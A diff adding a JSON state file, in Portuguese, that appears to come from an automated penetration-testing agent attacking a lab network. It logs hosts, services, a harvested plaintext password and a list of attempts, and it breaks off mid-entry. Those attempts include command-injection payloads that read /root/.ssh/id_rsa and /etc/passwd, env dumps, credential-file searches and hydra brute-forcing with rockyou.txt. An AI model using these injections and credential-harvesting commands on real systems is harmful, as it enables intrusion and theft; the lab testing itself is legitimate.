@@ -1,0 +1,1378 @@
+{
+ "hosts": [
+  {
+   "endereco": "172.20.0.5",
+   "nome": "atacante",
+   "subrede": "172.20.0.0/24",
+   "enumerado": false,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": true,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": []
+  },
+  {
+   "endereco": "172.20.0.1",
+   "nome": null,
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 111,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "rpcbind",
+     "versao": "2-4 (RPC #100000)",
+     "incerto": false
+    },
+    {
+     "porta": 55263,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "status",
+     "versao": "1 (RPC #100024)",
+     "incerto": false
+    },
+    {
+     "porta": 68,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "dhcpc",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 80,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "http",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 111,
+     "protocolo": "udp",
+     "estado": "open",
+     "servico": "rpcbind",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 123,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "ntp",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 136,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "profile",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 137,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "netbios-ns",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 514,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "syslog",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 520,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "route",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 631,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "ipp",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 998,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "puparp",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 1026,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "win-rpc",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 1433,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "ms-sql-s",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 1646,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "radacct",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 1701,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "L2TP",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 2048,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "dls-monitor",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 3283,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "netassistant",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 3456,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "IISrpc-or-vat",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 4500,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "nat-t-ike",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 5060,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "sip",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 20031,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "bakbonenetvault",
+     "versao": null,
+     "incerto": false
+    },
+    {
+     "porta": 49152,
+     "protocolo": "udp",
+     "estado": "closed",
+     "servico": "unknown",
+     "versao": null,
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.10",
+   "nome": "tcc-host-web.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": "injecao de comando em /diagnostico (param destino)",
+   "origem": false,
+   "titulo": "Diagnostico de rede -- infra interna",
+   "rotas": [
+    {
+     "caminho": "/diagnostico",
+     "metodo": "GET",
+     "parametros": [
+      "destino"
+     ],
+     "porta": 8080
+    }
+   ],
+   "usuario": "root",
+   "uid": 0,
+   "caminhos": [
+    "/root",
+    "/usr/local/bin",
+    "/opt/diagnostico",
+    "/opt/diagnostico/config.ini",
+    "/opt/diagnostico/app.py",
+    "/usr/local/bin/2to3",
+    "/usr/local/bin/2to3-3.11",
+    "/usr/local/bin/flask",
+    "/usr/local/bin/idle",
+    "/usr/local/bin/idle3",
+    "/usr/local/bin/idle3.11",
+    "/usr/local/bin/pip",
+    "/usr/local/bin/pip3",
+    "/usr/local/bin/pip3.11",
+    "/usr/local/bin/pydoc",
+    "/usr/local/bin/pydoc3",
+    "/usr/local/bin/pydoc3.11",
+    "/usr/local/bin/python",
+    "/usr/local/bin/python-config",
+    "/usr/local/bin/python3",
+    "/usr/local/bin/python3-config",
+    "/usr/local/bin/python3.11",
+    "/usr/local/bin/python3.11-config",
+    "/usr/local/bin/wheel"
+   ],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 8080,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "http-proxy",
+     "versao": "Werkzeug/3.1.9 Python/3.11.17",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.11",
+   "nome": "tcc-host-glhf.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": "Redirecting...",
+   "rotas": [
+    {
+     "caminho": "/login",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/login",
+     "metodo": "POST",
+     "parametros": [
+      "username",
+      "password"
+     ],
+     "porta": 1337
+    },
+    {
+     "caminho": "/register",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/readme.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/nicks.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/rockyou.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/register",
+     "metodo": "POST",
+     "parametros": [
+      "username",
+      "email",
+      "password"
+     ],
+     "porta": 1337
+    },
+    {
+     "caminho": "/user",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/direct",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/board",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/resetdb",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/logout",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    }
+   ],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {
+    "1337": 2699
+   },
+   "servicos": [
+    {
+     "porta": 1337,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "waste",
+     "versao": null,
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.12",
+   "nome": "tcc-srv-deploy.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": false,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": "svc_deploy",
+   "uid": 1000,
+   "caminhos": [
+    "/home",
+    "/opt",
+    "/home/svc_deploy",
+    "/home/svc_deploy/.bash_logout",
+    "/home/svc_deploy/.bashrc",
+    "/home/svc_deploy/.profile",
+    "/etc/selinux/semanage.conf",
+    "/etc/xattr.conf",
+    "/etc/adduser.conf",
+    "/etc/e2scrub.conf",
+    "/etc/gai.conf",
+    "/etc/host.conf",
+    "/etc/ld.so.conf",
+    "/etc/mke2fs.conf",
+    "/etc/nsswitch.conf",
+    "/etc/ld.so.conf.d/libc.conf",
+    "/etc/ld.so.conf.d/x86_64-linux-gnu.conf",
+    "/etc/pam.conf",
+    "/etc/security/pam_env.conf",
+    "/etc/security/group.conf",
+    "/etc/security/sepermit.conf",
+    "/etc/security/access.conf",
+    "/etc/security/limits.conf",
+    "/etc/security/faillock.conf",
+    "/etc/security/namespace.conf",
+    "/etc/security/time.conf",
+    "/etc/resolv.conf",
+    "/etc/deluser.conf",
+    "/etc/libaudit.conf",
+    "/etc/debconf.conf",
+    "/etc/sysctl.conf",
+    "/etc/ucf.conf",
+    "/usr/lib/tmpfiles.d/passwd.conf",
+    "/usr/lib/sysctl.d/99-protect-links.conf",
+    "/usr/share/debconf/debconf.conf",
+    "/usr/share/libc-bin/nsswitch.conf",
+    "/usr/share/nmap/scripts/http-cookie-flags.nse"
+   ],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 22,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": null,
+     "versao": null,
+     "incerto": false
+    }
+   ]
+  }
+ ],
+ "credenciais": [
+  {
+   "usuario": "svc_deploy",
+   "tipo": "senha",
+   "segredo": "7fQx2Lm9RtVzB4kd",
+   "identidade": null,
+   "origem": "172.20.0.10",
+   "tentada_em": [
+    "172.20.0.12"
+   ],
+   "validada_em": [
+    "172.20.0.12"
+   ],
+   "recusada_em": []
+  }
+ ],
+ "alcances": [
+  {
+   "origem": "172.20.0.12",
+   "destino": "172.20.0.12",
+   "via": "172.20.0.12"
+  }
+ ],
+ "tentativas": [
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sn 172.20.0.0/24",
+   "rotulo": "nmap -sn 172.20.0.0/24",
+   "alvo": "172.20.0.0/24",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "5 hosts, 0 servicos",
+   "revisao": 2,
+   "revisao_ao_abrir": 1
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.10",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.10",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 3,
+   "revisao_ao_abrir": 2
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/",
+   "rotulo": "curl http://172.20.0.10:8080/",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 4,
+   "revisao_ao_abrir": 3
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=127.0.0.1;id",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=127.0.0.1;id'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "rejeitada pela guarda de escopo: fora do escopo do laboratorio: 127.0.0.1 nao pertence a nenhuma faixa deste ambiente",
+   "revisao": 4,
+   "revisao_ao_abrir": 4
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;id",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;id'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: usuario root",
+   "revisao": 6,
+   "revisao_ao_abrir": 4
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/root/.ssh/id_rsa%202>/dev/null;cat%20/etc/passwd",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/root/.ssh/id_rsa%202>/dev/null;cat%20/etc/passwd'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;env;echo%20---;find%20/%20-maxdepth%203%20-iname%20\"*.env\"%20-o%20-iname%20\"*deploy*\"%20-o%20-iname%20\"*credential*\"%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;env;echo%20---;find%20/%20-maxdepth%203%20-iname%20\"*.env\"%20-o%20-iname%20\"*deploy*\"%20-o%20-iname%20\"*credential*\"%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: 3 caminhos novos",
+   "revisao": 7,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/opt/diagnostico%20/usr/local/bin;cat%20/opt/diagnostico/*%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/opt/diagnostico%20/usr/local/bin;cat%20/opt/diagnostico/*%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 1 credencial(is); saida: 21 caminhos novos",
+   "revisao": 9,
+   "revisao_ao_abrir": 7
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ssh svc_deploy@172.20.0.12",
+   "rotulo": "ssh svc_deploy@172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 255): Pseudo-terminal will not be allocated because stdin is not a terminal.; falha de ssh",
+   "revisao": 9,
+   "revisao_ao_abrir": 9
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -l svc_deploy -p c01 ssh://172.20.0.12",
+   "rotulo": "hydra -l svc_deploy -p c01 ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; 1 senha(s), concluida=True",
+   "revisao": 10,
+   "revisao_ao_abrir": 9
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ssh -o StrictHostKeyChecking=no -o BatchMode=no svc_deploy@172.20.0.12 id; hostname; ls -la /root /opt /home 2>/dev/null",
+   "rotulo": "ssh svc_deploy@172.20.0.12 'id; hostname; ls -la /root /opt /home 2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 255): Warning: Permanently added '172.20.0.12' (ED25519) to the list of known hosts.; permissao negada",
+   "revisao": 10,
+   "revisao_ao_abrir": 10
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password svc_deploy@172.20.0.12 id; hostname; ls -la /root /opt /home 2>/dev/null",
+   "rotulo": "sshpass -p c01 ssh svc_deploy@172.20.0.12 'id; hostname; ls -la /root /opt /home 2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "c01 resolvida para o segredo da credencial; ssh falhou (codigo 2): uid=1000(svc_deploy) gid=1000(svc_deploy) groups=1000(svc_deploy); sessao estabelecida; saida: usuario svc_deploy, 3 caminhos novos",
+   "revisao": 12,
+   "revisao_ao_abrir": 10
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ls -la /opt /home/svc_deploy; find / -maxdepth 4 -iname *trofeu* -o -iname *flag* -o -iname *credential* -o -iname *.env 2>/dev/null; sudo -l 2>/dev/null",
+   "rotulo": "ls -la /opt '/home/svc_deploy;' find / -maxdepth 4 -iname '*trofeu*' '*flag*' '*credential*' '*.env' '2>/dev/null;' sudo -l '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 127): /home/svc_deploy:; sessao estabelecida; saida: 3 caminhos novos",
+   "revisao": 14,
+   "revisao_ao_abrir": 12
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ls -la /opt; find /opt -maxdepth 3 -type f 2>/dev/null; sudo -l 2>/dev/null",
+   "rotulo": "ls -la '/opt;' find /opt -maxdepth 3 -type f '2>/dev/null;' sudo -l '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 127): total 8; sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 14,
+   "revisao_ao_abrir": 14
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sudo -l",
+   "rotulo": "sudo -l",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 127): bash: line 1: sudo: command not found; sessao estabelecida; saida: ferramenta ausente neste host: sudo",
+   "revisao": 14,
+   "revisao_ao_abrir": 14
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "find / -maxdepth 5 -iname *deploy* -o -iname *glhf* -o -iname *.conf -o -iname *.ini -o -iname *.key -o -iname *trofeu* -o -iname *flag* 2>/dev/null",
+   "rotulo": "find / -maxdepth 5 -iname '*deploy*' '*glhf*' '*.conf' '*.ini' '*.key' '*trofeu*' '*flag*' '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): /etc/selinux/semanage.conf; sessao estabelecida; saida: 31 caminhos novos",
+   "revisao": 15,
+   "revisao_ao_abrir": 14
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.11",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.11",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 16,
+   "revisao_ao_abrir": 15
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "nc -nv 172.20.0.11 1337",
+   "rotulo": "nc -nv 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "netcat falhou (codigo -1): Connection to 172.20.0.11 1337 port [tcp/*] succeeded!; 172.20.0.11:1337 aberta; a conexao abriu e o servico nao respondeu nada",
+   "revisao": 16,
+   "revisao_ao_abrir": 16
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "bash -c echo -e \"help\\r\\n\" | nc -nv 172.20.0.11 1337",
+   "rotulo": "bash -c 'echo -e \"help\\r\\n\" | nc -nv 172.20.0.11 1337'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "172.20.0.11:1337 aberta; o servico respondeu HTTP, codigo 400",
+   "revisao": 17,
+   "revisao_ao_abrir": 16
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/",
+   "rotulo": "curl http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 18,
+   "revisao_ao_abrir": 17
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/login",
+   "rotulo": "curl http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 18
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/nicks.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/nicks.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1871 bytes de corpo, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L <(curl -s http://172.20.0.11:1337/download/nicks.txt) -P <(curl -s http://172.20.0.11:1337/download/rockyou.txt) -s 1337 172.20.0.11 http-post-form /login:username=^USER^&password=^PASS^:F=incorrect",
+   "rotulo": "hydra -L '<(curl' -s 'http://172.20.0.11:1337/download/nicks.txt)' -P '<(curl' -s 'http://172.20.0.11:1337/download/rockyou.txt)' -s 1337 172.20.0.11 http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "hydra falhou (codigo 2): sh: 1: Syntax error: \"(\" unexpected; 0 senha(s), concluida=False",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -o /tmp/nicks.txt http://172.20.0.11:1337/download/nicks.txt && curl -s -o /tmp/rockyou.txt http://172.20.0.11:1337/download/rockyou.txt && wc -l /tmp/nicks.txt /tmp/rockyou.txt",
+   "rotulo": "curl -o /tmp/nicks.txt http://172.20.0.11:1337/download/nicks.txt '&&' -o /tmp/rockyou.txt http://172.20.0.11:1337/download/rockyou.txt '&&' wc -l /tmp/nicks.txt /tmp/rockyou.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 53 bytes de corpo, 0 credencial(is)",
+   "revisao": 19,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L /tmp/nicks.txt -P /tmp/rockyou.txt -s 1337 172.20.0.11 http-post-form /login:username=^USER^&password=^PASS^:F=incorrect",
+   "rotulo": "hydra -L /tmp/nicks.txt -P /tmp/rockyou.txt -s 1337 172.20.0.11 http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "2699 senha(s), concluida=True",
+   "revisao": 20,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -c /tmp/glhf_cookies.txt -X POST http://172.20.0.11:1337/login -d username=admin&password=admin",
+   "rotulo": "curl -c /tmp/glhf_cookies.txt -X POST http://172.20.0.11:1337/login -d 'username=admin&password=admin'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_cookies.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -b /tmp/glhf_cookies.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_cookies.txt -L http://172.20.0.11:1337/",
+   "rotulo": "curl -b /tmp/glhf_cookies.txt -L http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -D - -o /dev/null -b /tmp/glhf_cookies.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -D - -o /dev/null -b /tmp/glhf_cookies.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/register",
+   "rotulo": "curl http://172.20.0.11:1337/register",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -c /tmp/glhf_reg.txt -X POST http://172.20.0.11:1337/register -d username=admin&email=admin@test.com&password=Admin123!",
+   "rotulo": "curl -c /tmp/glhf_reg.txt -X POST http://172.20.0.11:1337/register -d 'username=admin&email=admin@test.com&password=Admin123!'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -c /tmp/glhf_reg2.txt -X POST http://172.20.0.11:1337/login -d username=admin&password=Admin123!",
+   "rotulo": "curl -c /tmp/glhf_reg2.txt -X POST http://172.20.0.11:1337/login -d 'username=admin&password=Admin123!'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -D - -o /dev/null -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -D - -o /dev/null -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/dashboard",
+   "rotulo": "curl -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/dashboard",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 404, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/board",
+   "rotulo": "curl -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/board",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/user",
+   "rotulo": "curl -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/user",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": true,
+   "sucesso": true,
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/direct",
+   "rotulo": "curl -b /tmp/glhf_reg2.txt http://172.20.0.11:1337/direct",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
